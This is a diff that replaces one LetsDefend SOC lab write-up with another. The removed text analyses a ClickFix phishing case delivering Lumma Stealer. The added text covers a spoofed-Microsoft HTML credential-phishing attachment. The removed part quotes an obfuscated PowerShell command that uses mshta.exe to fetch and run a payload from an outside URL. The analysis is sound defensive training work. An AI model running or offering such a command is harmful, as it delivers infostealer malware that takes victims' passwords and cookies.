@@ -1,112 +1,97 @@
-# SOC338 – Lumma Stealer ClickFix Phishing
+# SOC143 – Password Stealer Detected
 
-**Platform:** LetsDefend | **Severity:** Critical | **Classification:** True Positive | **Date:** March 13, 2025
-**Host:** `172.16.17.216` | **User:** `dylan@letsdefend.io`
+**Platform:** LetsDefend | **Severity:** Medium | **Classification:** True Positive | **Date:** April 26, 2021
+**Sender:** `bill@microsoft.com` | **User:** `ellie@letsdefend.io`
 
 ## Summary
 
-A phishing email offering a free Windows 11 Pro upgrade led the user to `windows-update.site`, which used a ClickFix lure to get the user to run a hidden PowerShell command. The command used `mshta.exe` to fetch a Lumma Stealer payload, and the firewall allowed the connection.
+A spoofed email from `bill@microsoft.com` delivered a password-protected zip containing an HTML credential-phishing page that impersonated a Microsoft login. The email was deleted, and no evidence showed the attachment was opened or credentials were submitted.
 
-<img width="1574" height="547" alt="338-01-alert" src="https://github.com/user-attachments/assets/61a9f5b3-0b6c-4ebc-aecb-e02591db73f3" />
+[DRAG 01-alert-details.png HERE]
 
 ## The Attack
 
-**ClickFix** is a social engineering technique that gets the victim to infect their own machine. The malicious page silently copies a command to the clipboard, then shows fake "verification" steps: press **Win+R**, press **Ctrl+V**, press **Enter**. The user thinks they're passing a CAPTCHA, but they're pasting and running the attacker's command. Because the user runs it themselves, it bypasses many browser and email protections.
+**HTML attachment phishing** sends the fake login page as a file instead of a link. When the victim opens it, the page renders locally in the browser, so URL filters and link scanners never see a malicious website. Any credentials typed into the form are sent to the attacker.
 
-**Lumma Stealer** is an infostealer sold as malware-as-a-service. It steals saved browser passwords, session cookies, and cryptocurrency wallets and sends them to the attacker.
+The **password-protected zip** (password `infected`) adds another layer: email gateways can't scan inside an encrypted archive, so the HTML file passes through unexamined.
 
 ## Timeline
 
-| Time (endpoint) | Event |
+| Time (alert) | Event |
 | --- | --- |
-| 02:44:00 | Phishing email delivered from `update@windows-update.site` |
-| 23:26:08 | User visits `https://windows-update.site/` |
-| 23:26:20 | `mshta.exe` (PID 7284) connects to `172.67.139.19:443`, allowed* |
-| 23:26:31 | `powershell.exe` (PID 624) runs `mshta.exe` with the payload URL |
-| 23:26:32 | Obfuscated version of the same command executes |
+| 23:03:14 | Email delivered from `bill@microsoft.com` to `ellie@letsdefend.io`, device action Allowed |
+| — | Email deleted from the mailbox |
 
-*Firewall log shows 16:26:20; log management is 7 hours behind endpoint time. The connection appearing before the PowerShell entries is a minor discrepancy between log sources.
+*Email Security shows 16:03:14; it is 7 hours behind the alert time (+03:00).
 
 ## Investigation
 
 ### 1. Email Analysis
 
-- **From:** `update@windows-update.site` (sender IP `132.232.40.201`)
-- **Subject:** "Upgrade your system to Windows 11 Pro for FREE"
+- **From:** `bill@microsoft.com` (sender IP `180.76.101.229`)
+- **Subject:** "."
+- **Body:** Empty
+- **Attachment:** `bd05664f01205fa90774f42468a8743a.zip` (password `infected`)
 - **Gateway action:** Deleted
 
-The email impersonated Microsoft, used a fake countdown timer for urgency, and pointed every "UPDATE NOW" link to `windows-update.site`, which VirusTotal flagged as malicious (10/93). The email body itself included the ClickFix steps.
+The sender address claims to be Microsoft, but the sending IP is not Microsoft infrastructure, so the sender is spoofed. A one-character subject, an empty body, and an encrypted attachment are all common phishing traits.
 
-<img width="1919" height="974" alt="338-02-alert" src="https://github.com/user-attachments/assets/96ab61b3-b3bb-4db5-9693-f5d132d081d2" />
+[DRAG 02-email-security.png HERE]
 
-### 2. Endpoint Analysis
+### 2. Attachment Analysis
 
-Browser history confirms the visit to `windows-update.site` at 23:26:08.
+The zip contains `Ellie@letsdefend.io_63963965Application.HTML`, a fake Microsoft login page personalized with the recipient's address. VirusTotal flagged it as malicious (27/60), with detections including `phishing.hidden/akgpp` and `Trojan.HTML.Hidden.2.Gen`.
 
-<img width="1547" height="714" alt="338-history" src="https://github.com/user-attachments/assets/46830a24-ec85-41dc-b824-423b69ec3920" />
+[DRAG 03-virustotal-html.png HERE]
 
-The process logs show Chrome activity at 23:26:08, followed 11 seconds later by `explorer.exe` (PID 6920) launching `powershell.exe` (PID 624). That's the user following the ClickFix steps right after landing on the page.
+The download URL scored 6/92, but that result reflects LetsDefend's download wrapper page (`text/html`, 2.24 KB), not the attachment itself.
 
-<img width="544" height="406" alt="SOC-338-secondpage" src="https://github.com/user-attachments/assets/f40432b4-2952-450b-8342-f7762f1d9393" />
+[DRAG 04-virustotal-url.png HERE]
 
-At 23:26:19, the user ran the ClickFix command from the Run dialog:
+Most of the file's contacted hosts were background traffic any browser generates in a sandbox, identified by their Autonomous System numbers:
 
-```
-PowerShell.exe -w 1 powershell -Command ('ms]]]ht]]]a]]].]]]exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4' -replace ']') # ✅ ''I am not a robot - reCAPTCHA Verification ID: 3824''
-```
+| AS | Owner | Examples |
+| --- | --- | --- |
+| 8068 | Microsoft | `business.bing.com`, Edge telemetry |
+| 15169 | Google | `encrypted-tbn0.gstatic.com` |
+| 20940 | Akamai | CDN |
+| — | Local multicast | `239.255.255.250` (SSDP) |
+| 19679 | **Dropbox** | `dl.dropboxusercontent.com`, `162.125.3.15`, `162.125.8.15` |
 
-- `-w 1` runs PowerShell with a hidden window.
-- `-replace ']'` strips the brackets, rebuilding `mshta.exe` so the name never appears in plain text (evades simple detection).
-- Everything after `#` is a comment. It's what the user sees at the end of the Run box, making the command look like a CAPTCHA check.
+Dropbox stood out: a clean browser has no reason to contact Dropbox's file-download domain, and it was the only domain with vendor detections (3/92). The page most likely loaded phishing content from it. Because Dropbox is a legitimate service, its IPs were treated as leads to check rather than confirmed malicious indicators.
 
-<img width="767" height="258" alt="SOC-338-captcha" src="https://github.com/user-attachments/assets/ee25935c-cd44-4092-8638-45edab134e0e" />
+[DRAG 05-virustotal-relations.png HERE]
 
-<img width="1225" height="520" alt="338-terminal" src="https://github.com/user-attachments/assets/ef98cb5d-eaa3-4944-9ccf-207ef88a08dc" />
+### 3. Endpoint and Log Analysis
 
-The process logs show the full chain:
+Endpoint Security has no host matching Ellie, so there was no device to inspect or contain.
 
-```
-userinit.exe
-└─ explorer.exe (PID 6920)
-   └─ powershell.exe (PID 624)    obfuscated ClickFix command
-      └─ powershell.exe (PID 7308)  -Command "mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4"
-         └─ mshta.exe (PID 7284)      fetches the payload
-            └─ conhost.exe
-```
+[DRAG 06-endpoint-security.png HERE]
 
-<img width="560" height="447" alt="SOC338-ProcessesView" src="https://github.com/user-attachments/assets/dc098e5e-c703-4a43-b96f-da40394efbdb" />
+Log Management searches across all time returned 0 events for the sender address, the sender IP, and the contacted Dropbox IP. No traffic shows the attachment being opened.
 
-<img width="707" height="167" alt="SOC338-PS624" src="https://github.com/user-attachments/assets/8159e2fb-5375-42c4-b1b2-77b1736d4014" />
+[DRAG 07-logs-sender-address.png HERE]
 
-<img width="675" height="205" alt="SOC338-PS7308" src="https://github.com/user-attachments/assets/87d18735-339a-422d-b7d3-17eac6aa18ea" />
+[DRAG 08-logs-sender-ip.png HERE]
 
-<img width="525" height="206" alt="SOC338-mshta7284" src="https://github.com/user-attachments/assets/c21e73ce-6369-4f2a-bf73-acfe60bae780" />
-
-`explorer.exe` as the parent of PID 624 confirms the user ran the command manually from the Run dialog. `mshta.exe` is a legitimate Windows binary for running HTML Applications, abused here to execute remote code, and the `.mp4` extension disguises the payload. Its `conhost.exe` child suggests the payload may have started a console process. Later log entries for PIDs 624 and 7308 (23:26:31–32) are repeat events for the same processes, not a second execution. All processes ran as `EC2AMAZ-ILGVOIN\LetsDefend`.
-
-<img width="1392" height="710" alt="338-03" src="https://github.com/user-attachments/assets/44297761-1ad2-4e93-98af-a899aa00908c" />
-### 3. Network Analysis
-
-Firewall logs show `mshta.exe` (PID 7284) making an allowed HTTPS connection from `172.16.17.216:34211` to `172.67.139.19:443`, with a request URL matching the payload. The IP is in Cloudflare's range, so it fronts the attacker's server rather than identifying it directly.
-
-<img width="1559" height="623" alt="338-network" src="https://github.com/user-attachments/assets/d78d5aff-77d0-4928-aaca-49dc7676f459" />
+[DRAG 09-logs-dropbox-ip.png HERE]
 
 ## Indicators of Compromise
 
 | Type | Indicator |
 | --- | --- |
-| Sender Address | `update@windows-update.site` |
-| Sender IP | `132.232.40.201` |
-| Phishing Domain | `windows-update.site` |
-| Payload URL | `https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4` |
-| Payload Server IP | `172.67.139.19` (Cloudflare) |
+| Sender Address | `bill@microsoft.com` (spoofed) |
+| Sender IP | `180.76.101.229` |
+| Attachment URL | `https://files-ld.s3.us-east-2.amazonaws.com/bd05664f01205fa90774f42468a8743a.zip` |
+| Zip MD5 | `bd05664f01205fa90774f42468a8743a` |
+| HTML SHA-256 | `58c45547bccce5eb16d84bae13eb0c2813ffe03e34eae622b65468a6b289ca37` |
 
 ## Response and Recommendations
 
-Host `172.16.17.216` was contained. Next steps: reimage the host, reset the user's credentials and revoke active sessions (Lumma targets saved passwords and cookies), block the IOCs, and train users that legitimate sites never ask them to paste commands into the Run dialog.
+The email was deleted from the mailbox. Next steps: block the sender IP and attachment hashes at the email gateway, enforce SPF, DKIM, and DMARC checks to stop spoofed Microsoft senders, and train users that Microsoft never sends login pages as attachments. If Ellie's account becomes reachable, reset her credentials as a precaution.
 
 ## Conclusion
 
-**True Positive.** The user executed a malicious ClickFix command, and the connection to the payload server was allowed. Lumma Stealer execution, C2 communication, and data exfiltration were not confirmed, but credential compromise should be assumed.
+**True Positive.** The email was malicious: a spoofed Microsoft sender delivering a credential-phishing page. The email was deleted, and no logs or endpoint activity showed the attachment was opened, so the outcome is **Not Opened** with no confirmed compromise.
 
-**MITRE ATT&CK:** T1566.002 (Spearphishing Link), T1204.004 (Malicious Copy and Paste), T1059.001 (PowerShell), T1027 (Obfuscation), T1218.005 (Mshta)
+**MITRE ATT&CK:** T1566.001 (Spearphishing Attachment), T1656 (Impersonation), T1027.013 (Encrypted/Encoded File)
